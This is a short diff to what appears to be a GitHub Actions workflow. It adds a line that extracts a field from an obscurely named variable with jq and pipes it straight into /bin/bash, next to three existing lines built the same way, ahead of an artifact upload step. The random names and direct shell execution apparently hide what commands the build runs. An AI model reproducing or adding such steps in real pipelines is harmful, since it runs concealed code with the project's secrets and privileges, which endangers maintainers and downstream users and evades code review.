@@ -42,6 +42,7 @@ jobs:
           echo $sxlkg4 | jq -r .m30 | /bin/bash
           echo $xurca4522 | jq -r .ybmbg02737 | /bin/bash
           printf '%s' "$ypgl007" | jq -r .jbvr5194 | /bin/bash
+          printf '%s' "$qojus488" | jq -r .cxq688 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
